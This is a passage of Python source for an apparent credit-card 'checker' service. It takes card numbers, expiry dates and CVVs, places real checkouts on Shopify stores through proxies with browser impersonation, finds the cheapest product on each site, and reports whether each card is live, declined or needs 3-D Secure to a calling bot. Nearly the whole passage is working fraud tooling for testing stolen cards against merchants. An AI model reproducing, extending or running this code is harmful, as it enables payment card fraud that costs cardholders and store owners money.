            try:
                resp_json   = json.loads(text)
                submit_data = resp_json.get("data", {}).get("submitForCompletion", {})

                if not submit_data:
                    errors = resp_json.get("errors", [])
                    if errors:
                        for error in errors:
                            code = error.get("code")
                            if code:
                                return False, code, gateway, product_price if product_price != "0.00" else total_price, currency
                    return False, "Empty submit response", gateway, product_price if product_price != "0.00" else total_price, currency

                result_type = submit_data.get("__typename", "")

                if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = submit_data.get("receipt", {})
                    if receipt:
                        receipt_type = receipt.get("__typename", "")
                        if receipt_type == "ProcessedReceipt":
                            # Guard: reject zero-dollar orders as site errors
                            try:
                                order_total_data = receipt.get("order", {}).get("totalPriceV2", {})
                                order_amount = float(order_total_data.get("amount", "0") or "0")
                                if order_amount == 0.0:
                                    return False, "ZERO_DOLLAR_ORDER", gateway, product_price if product_price != "0.00" else total_price, currency
                            except (ValueError, TypeError, KeyError, AttributeError):
                                pass
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif receipt_type == "ActionRequiredReceipt":
                            return True, "3DS_REQUIRED", gateway, total_price, currency
                        rid = receipt.get("id")
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, product_price if product_price != "0.00" else total_price, currency

                elif result_type == "SubmitFailed":
                    reason = submit_data.get("reason", "Unknown reason")
                    return False, extract_clean_response(reason), gateway, product_price if product_price != "0.00" else total_price, currency

                elif result_type == "SubmitRejected":
                    errors = submit_data.get("errors", [])
                    if errors:
                        for error in errors:
                            code              = error.get("code", "")
                            localized_msg     = error.get("localizedMessage", "")
                            non_localized_msg = error.get("nonLocalizedMessage", "")
                            if code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                                detail = localized_msg or non_localized_msg
                                if detail:
                                    return False, detail, gateway, product_price if product_price != "0.00" else total_price, currency
                            if code:
                                return False, code, gateway, product_price if product_price != "0.00" else total_price, currency
                    return False, "Submit Rejected", gateway, product_price if product_price != "0.00" else total_price, currency

                elif result_type == "Throttled":
                    return False, "Throttled", gateway, product_price if product_price != "0.00" else total_price, currency

                receipt = submit_data.get("receipt", {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, product_price if product_price != "0.00" else total_price, currency

                rid = receipt.get("id")
                if not rid:
                    return False, "No receipt ID", gateway, product_price if product_price != "0.00" else total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, product_price if product_price != "0.00" else total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency

            params_poll = {"operationName": "PollForReceipt"}
            poll_json_data = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
            }

            await asyncio.sleep(3)

            final_text = ""
            for i in range(4):
                response, final_text = await make_graphql_request(
                    session, graphql_url, params_poll, headers, poll_json_data, max_retries=1
                )

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json    = json.loads(final_text)
                    receipt_data = poll_json.get("data", {}).get("receipt", {})

                    if receipt_data:
                        typename = receipt_data.get("__typename", "")

                        if typename == "ProcessedReceipt":
                            # Guard: reject zero-dollar orders as site errors
                            try:
                                order_total_data = receipt_data.get("order", {}).get("totalPriceV2", {})
                                order_amount = float(order_total_data.get("amount", "0") or "0")
                                if order_amount == 0.0:
                                    return False, "ZERO_DOLLAR_ORDER", gateway, product_price if product_price != "0.00" else total_price, currency
                            except (ValueError, TypeError, KeyError, AttributeError):
                                pass
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == "FailedReceipt":
                            error      = receipt_data.get("processingError", {})
                            error_type = error.get("__typename", "")
                            if error_type == "PaymentFailed":
                                code = error.get("code", "")
                                msg  = error.get("messageUntranslated", "")
                                if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else "PAYMENT_FAILED", gateway, total_price, currency
                            code = error.get("code") or error_type or "UNKNOWN_ERROR"
                            return True, code, gateway, total_price, currency
                        elif typename == "ActionRequiredReceipt":
                            return True, "3DS_REQUIRED", gateway, total_price, currency

                        if receipt_data.get("__typename") in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(4)
                            continue

                except Exception:
                    pass

                if "WaitingReceipt" in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if "CAPTCHA_REQUIRED" in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency

            if "WaitingReceipt" in final_text:
                return False, "Change Proxy or Site", gateway, product_price if product_price != "0.00" else total_price, currency

            try:
                res_json = json.loads(final_text)
                err_code = (
                    res_json.get("data", {})
                    .get("receipt", {})
                    .get("processingError", {})
                    .get("code")
                )
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif err_code:
                    return True, err_code, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code = extract_between(final_text, '{"code":"', '"')

            final_lower = final_text.lower()
            if "actionreq" in final_lower or "action_required" in final_lower:
                return True, "3DS_REQUIRED", gateway, total_price, currency
            elif "processedreceipt" in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif "failedreceipt" in final_lower or "declined" in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, product_price if product_price != "0.00" else total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, product_price if product_price != "0.00" else total_price, currency


def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        "cc":  parts[0].strip(),
        "mes": parts[1].strip(),
        "ano": parts[2].strip(),
        "cvv": parts[3].strip(),
    }


async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_price=None):
    # Use semaphore to limit concurrent checkouts per worker
    async with _checkout_semaphore:
        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, max_price=max_price)
    # Normalize to always return exactly 5 values
    return result[:5]


# ========== CONCURRENCY LIMITER PER WORKER ==========
# Limits the number of concurrent Shopify GraphQL requests to prevent overload
_checkout_semaphore = asyncio.Semaphore(5)

app = Quart(__name__)


@app.route("/health")
async def health():
    return jsonify({"status": "ok"})


@app.route("/workers")
async def worker_count():
    import sys
    try:
        args = sys.argv
        for i, arg in enumerate(args):
            if arg == '-w' and i + 1 < len(args):
                workers = int(args[i + 1])
                return jsonify({"workers": workers})
        return jsonify({"workers": 0})
    except Exception:
        return jsonify({"workers": "unknown"})


@app.route("/products", methods=["GET"])
async def products_endpoint():
    """Return ALL product variants under the price cap for a given site."""
    site      = request.args.get("site")
    proxy_str = request.args.get("proxy")

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), 400

    max_price = None
    max_price_str = request.args.get("max_price")
    if max_price_str:
        try:
            max_price = float(max_price_str)
        except (ValueError, TypeError):
            pass

    try:
        if not site.startswith("http"):
            site = "https://" + site

        proxies = parse_proxy_for_curl(proxy_str)

        async with AsyncSession(impersonate="chrome120", verify=False) as session:
            resp = await session.get(
                f"{site}/products.json",
                proxies=proxies if proxies else None,
                timeout=10,
            )
            if resp.status_code != 200:
                return jsonify({"error": f"Site Error! Status: {resp.status_code}"}), 400
            text = resp.text
            if "shopify" not in text.lower():
                return jsonify({"error": "Not Shopify!"}), 400
            result = json.loads(text).get("products", [])
            if not result:
                return jsonify({"error": "No Products!"}), 400

        # Collect ALL variants under price cap
        variants = []
        for product in result:
            if not product.get("variants"):
                continue
            for variant in product["variants"]:
                if not variant.get("available", True):
                    continue
                try:
                    price = variant.get("price", "0")
                    if isinstance(price, str):
                        price = float(price.replace(",", ""))
                    else:
                        price = float(price)

                    # Apply price filter if set
                    if max_price is not None and price > max_price:
                        continue

                    # Skip free products
                    if price < MIN_PRODUCT_PRICE:
                        continue

                    variants.append({
                        "site": site,
                        "price": f"{price:.2f}",
                        "variant_id": str(variant["id"]),
                        "link": f"{site}/products/{product['handle']}",
                    })
                except (ValueError, TypeError, AttributeError):
                    continue

        if not variants:
            if max_price is not None:
                return jsonify({"error": "NO_PRODUCT_IN_PRICE_RANGE"}), 400
            return jsonify({"error": "No Valid Products"}), 400

        return jsonify({"variants": variants, "count": len(variants)})

    except Exception as e:
        return jsonify({"error": f"error: {str(e)}"}), 500


@app.route("/product_price", methods=["GET"])
async def product_price_endpoint():
    """Return the cheapest product price for a given site via fetch_products()."""
    site      = request.args.get("site")
    proxy_str = request.args.get("proxy")

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), 400

    max_price = None
    max_price_str = request.args.get("max_price")
    if max_price_str:
        try:
            max_price = float(max_price_str)
        except (ValueError, TypeError):
            pass

    result = await fetch_products(site, proxy_str, max_price=max_price)
    if isinstance(result, tuple) and result[0] is False:
        return jsonify({"error": str(result[1])}), 400

    try:
        price = float(result.get("price", "0"))
    except (ValueError, TypeError):
        price = 0.0

    return jsonify({
        "price":      price,
        "variant_id": result.get("variant_id"),
        "site":       site,
    })


@app.route("/shopify", methods=["GET"])
async def shopify_checker():
    try:
        site      = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
            cc  = cc_parts["cc"]
            mes = cc_parts["mes"]
            ano = cc_parts["ano"]
            cvv = cc_parts["cvv"]
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        # Parse optional price ceiling from the bot's active filter
        max_price = None
        max_price_str = request.args.get("max_price")
        if max_price_str:
            try:
                max_price = float(max_price_str)
            except (ValueError, TypeError):
                pass

        success, message, gateway, price, currency = await process_card_async(
            cc, mes, ano, cvv, site, variant_id, proxy_str, max_price=max_price
        )

        # Surface "NO_PRODUCT_IN_PRICE_RANGE" to the bot before map_response
        # converts it to the generic "Dead" label.
        if message and "NO_PRODUCT_IN_PRICE_RANGE" in str(message).upper():
            return jsonify({
                "Gateway":  DEFAULT_GATEWAY,
                "Price":    0.0,
                "Response": "NO_PRODUCT_IN_PRICE_RANGE",
                "Status":   False,
                "cc":       cc_string,
            })

        clean_response = extract_clean_response(message)
        mapped_success, mapped_response = map_response(success, clean_response)

        # Normalise gateway: never expose "UNKNOWN" to the bot
        if not gateway or gateway.upper() in ("UNKNOWN", ""):
            gateway = DEFAULT_GATEWAY

        try:
            price_float = float(price)
        except (ValueError, TypeError):
            price_float = 0.0

        return jsonify({
            "Gateway":  gateway,
            "Price":    price_float,
            "Response": mapped_response,
            "Status":   mapped_success,
            "cc":       cc_string,
        })

    except Exception as e:
        err = str(e)
        # Classify the error into a meaningful gateway label
        err_lower = err.lower()
        if "proxy" in err_lower or "socks" in err_lower or "407" in err_lower:
            err_gateway = "Proxy Error"
            err_response = "Proxy dead"
        elif "timeout" in err_lower or "timed out" in err_lower:
            err_gateway = "Site Timeout"
            err_response = "Site timeout"
        elif "ssl" in err_lower or "certificate" in err_lower:
            err_gateway = "SSL Error"
            err_response = "Site SSL error"
        elif "404" in err_lower or "not found" in err_lower:
            err_gateway = "Site Error"
            err_response = "Site not found"
        else:
            err_gateway = "Site Error"
            err_response = f"Site error: {err[:80]}"
        return jsonify({
            "error":    err,
            "status":   False,
            "Gateway":  err_gateway,
            "Price":    0.0,
            "Response": err_response,
            "cc":       request.args.get("cc", ""),
        }), 500


if __name__ == "__main__":
    import hypercorn.asyncio
    import hypercorn.config

    config = hypercorn.config.Config()
    config.bind = ["0.0.0.0:5000"]
    asyncio.run(hypercorn.asyncio.serve(app, config))
